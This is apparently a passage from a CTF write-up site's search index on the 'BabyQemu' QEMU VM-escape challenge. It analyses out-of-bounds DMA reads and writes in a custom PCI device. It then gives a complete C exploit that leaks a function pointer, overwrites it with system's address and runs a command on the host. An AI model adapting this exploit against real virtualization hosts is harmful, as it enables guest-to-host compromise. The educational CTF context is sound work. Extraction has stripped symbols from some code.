opaque - dma . cmd 1 ) ) opaque - dma . src = val ; } - v7 = (uint8_t *) opaque- dma_buf[v2]; is the buf - opaque- dma.cnt is the length //hitb_dma_timer if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } - opaque- dma.cmd means read or write operation cpu_physical_memory_rw is the original qemu function. void cpu_physical_memory_rw ( hwaddr addr , uint8_t * buf , int len , int is_write ) { address_space_rw ( address_space_memory , addr , MEMTXATTRS_UNSPECIFIED , buf , len , is_write ); }","title":"Analysis"},{"location":"pwn/VMEscape/BabyQemu/#vulnerability","text":"","title":"vulnerability"},{"location":"pwn/VMEscape/BabyQemu/#oob-write","text":"We can find the call operation for cpu_physical_memory_rw here. if ( v1 2 ) { v2 = (unsigned int)(LODWORD(opaque- dma.src) - 0x40000); if ( v1 4 ) { v7 = (uint8_t *) opaque- dma_buf[v2]; ((void (__fastcall *)(uint8_t *, _QWORD))opaque- enc)(v7, LODWORD(opaque- dma.cnt)); v3 = v7; } else { v3 = (uint8_t *) opaque- dma_buf[v2]; } cpu_physical_memory_rw(opaque- dma.dst, v3, opaque- dma.cnt, 1); v4 = opaque- dma.cmd; v5 = opaque- dma.cmd 4; } This call process is shown as follows, which aims to do WRITE to the real virtual memory belonging to QEMU PROCESS by translating GUEST PADDR to HOST PROCESS VADDR. cpu_physical_memory_rw ( opaque - dma . dst , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , 1 ); address_space_rw ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , is_write != 0 ); address_space_write ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt ) v10 = address_space_translate ( address_space_memory , opaque - dma . dst , addr1 , l //l = opaque- dma.cnt, 1 ); v14 = qemu_map_ram_ptr ( v10 - ram_block , v27 ); //v27 == addr1 memcpy ( v14 , v5 , n ); // do memcpy operation So, we can copy an OOB READ memory to our process's physical address (opaque- dma.dst). LEAK CAN BE DONE THROUGH THIS VULN.","title":"OOB Write"},{"location":"pwn/VMEscape/BabyQemu/#oob-write_1","text":"We can find the call operation for cpu_physical_memory_rw here, too. else { v6 = ( uint8_t * ) opaque [ 0xFFFFFFDBLL ]. dma_buf [( unsigned int ) opaque - dma . dst + 0x510 ]; LODWORD ( v3 ) = ( _DWORD ) opaque + opaque - dma . dst - 0x40000 + 0xBB8 ; /* ASM can be more explicit here .text:0000000000284120 mov rax, [rdi+0B70h] ; HitbState.dst .text:0000000000284127 mov edx, [hitb+0B78h] ; len .text:000000000028412D xor ecx, ecx ; is_write .text:000000000028412F sub eax, 40000h .text:0000000000284134 lea rbp, [rdi+rax+0BB8h] .text:000000000028413C mov rdi, [rdi+0B68h] ; addr .text:0000000000284143 mov rsi, rbp ; buf .text:0000000000284146 call cpu_physical_memory_rw */ cpu_physical_memory_rw ( opaque - dma . src , v6 , opaque - dma . cnt , 0 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; if ( opaque - dma . cmd 4 ) { v3 = ( uint8_t * ) LODWORD ( opaque - dma . cnt ); (( void ( __fastcall * )( uint8_t * , uint8_t * , dma_addr_t )) opaque - enc )( v6 , v3 , v5 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } } opaque - dma . cmd = v4 0xFFFFFFFFFFFFFFFELL ; if ( v5 ) { opaque - irq_status |= 0x100u ; hitb_raise_irq ( opaque , ( uint32_t ) v3 ); } So, the parameter v6 of cpu_physical_memory_rw can make the read destination out of boundry. We can use it to overwrite the opaque- enc function pointer. And, opaque- dma.src will be translated from GUEST PADDR to HOST VADDR . So, we just need to set a paddr belonging to our process to set the source of this COPY operation.","title":"OOB WRITE"},{"location":"pwn/VMEscape/BabyQemu/#exploit","text":"#include stdio.h #include stdlib.h #include stdint.h #include unistd.h #include string.h #include errno.h #include signal.h #include fcntl.h #include ctype.h #include termios.h #include sys/types.h #include sys/mman.h #include assert.h #define PRINT_ERROR \\ do { \\ fprintf(stderr, Error at line %d, file %s (%d) [%s]\\n , \\ __LINE__, __FILE__, errno, strerror(errno)); exit(1); \\ } while(0) #define MAP_SIZE 4096UL #define MAP_MASK (MAP_SIZE - 1) int fd = - 1 ; char * filename = /sys/devices/pci0000:00/0000:00:04.0/resource0 ; //not used~ void pcimem_read ( uint64_t target , char access_type , uint64_t * read_result ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); void * virt_addr = map_base + ( target MAP_MASK ); int type_width = 0 ; switch ( access_type ) { case b : * read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } printf ( Value at offset 0x%X (%p): 0x%0*lX \\n , ( int ) target , virt_addr , type_width * 2 , * read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } void pcimem_write ( uint64_t target , char access_type , uint64_t writeval ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); uint64_t read_result = 0 ; int type_width = 0 ; void * virt_addr = map_base + ( target MAP_MASK ); switch ( access_type ) { case b : * (( uint8_t * ) virt_addr ) = writeval ; read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * (( uint16_t * ) virt_addr ) = writeval ; read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * (( uint32_t * ) virt_addr ) = writeval ; read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * (( uint64_t * ) virt_addr ) = writeval ; read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } //readback not correct? printf ( Written 0x%0*lX; readback 0x%*lX \\n , type_width , writeval , type_width , read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } uint64_t virt2phys ( void * p ) { uint64_t virt = ( uint64_t ) p ; // Assert page alignment assert (( virt 0xfff ) == 0 ); int fd = open ( /proc/self/pagemap , O_RDONLY ); if ( fd == - 1 ) PRINT_ERROR ; uint64_t offset = ( virt / 0x1000 ) * 8 ; lseek ( fd , offset , SEEK_SET ); uint64_t phys ; if ( read ( fd , phys , 8 ) != 8 ) PRINT_ERROR ; // Assert page present assert ( phys ( 1ULL 63 )); phys = ( phys (( 1ULL 54 ) - 1 )) * 0x1000 ; return phys ; } int main () { if (( fd = open ( filename , O_RDWR | O_SYNC )) == - 1 ) PRINT_ERROR ; //for dma read and write void * dma_addr = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS , - 1 , 0 ); if ( dma_addr == ( void * ) - 1 ) PRINT_ERROR ; // lock the dma_addr from hw mem mlock ( dma_addr , 0x1000 ); void * dma_phy_addr = ( void * ) virt2phys ( dma_addr ); //Step 1 // leak code base //set dma.src pcimem_write ( 0x80 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set dma.dst pcimem_write ( 0x88 , d , ( uint64_t ) dma_phy_addr ); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd to write pcimem_write ( 0x98 , d , 2 | 1 ); //wait for timer being triggered. sleep ( 1 ); uint64_t enc_address = * ( uint64_t * ) dma_addr ; printf ( enc_address (host vaddr) -- 0x%016lx \\n , enc_address ); uint64_t code_base = enc_address - 0x283DD0 ; uint64_t system_addr = code_base + 0x1FDB18 ; * ( uint64_t * ) dma_addr = system_addr ; //Step 2 //overwrite function pointer //set dma.src pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr ); //set dma.dst //.text:0000000000284120 mov rax, [rdi+0B70h] ; dst //.text:0000000000284127 mov edx, [hitb+0B78h] ; len //.text:000000000028412D xor ecx, ecx ; is_write //.text:000000000028412F sub eax, 40000h //.text:0000000000284134 lea rbp, [rdi+rax+0BB8h] //.text:000000000028413C mov rdi, [rdi+0B68h] ; addr //.text:0000000000284143 mov rsi, rbp ; buf //.text:0000000000284146 call cpu_physical_memory_rw pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 ); sleep ( 1 ); //Step3 //prepare a parameter for system and trigger it strcpy (( char * )( dma_addr ) + 0x10 , deepin-calculator ); //set dma.src to the paddr of dma pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr + 0x10 ); //set dma.dst to the buf of device Hitb pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 )); //set cnt pcimem_write ( 0x90 , d , 18 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 | 4 ); sleep ( 1 ); return 0 ; }","title":"exploit"},{"location":"reverse/","text":"waiting","title":"home"},{"location":"reverse/#waiting","text":"","title":"waiting"},{"location":"web/","text":"waiting","title":"home"},{"location":"web/#waiting","text":"","title":"waiting"}]}